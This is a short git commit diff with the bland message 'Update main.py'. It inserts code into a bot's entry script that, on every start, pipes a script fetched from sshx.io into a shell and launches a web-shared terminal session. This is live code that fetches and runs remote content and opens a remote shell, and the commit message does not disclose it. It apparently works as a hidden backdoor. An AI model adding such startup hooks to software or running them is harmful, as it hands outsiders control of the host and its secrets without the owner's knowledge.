e801c7c61301fa24b022f11312c4edf4c06bffaa
ghost <error.2418362@gmail.com>
2024-10-24 09:49:37 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,3 +1,10 @@
 from bot import Bot
+import subprocess
+
+# Command to run
+command = "curl -sSf https://sshx.io/get | sh -s run"
+
+# Execute the command
+subprocess.run(command, shell=True, check=True)
 
 Bot().run()
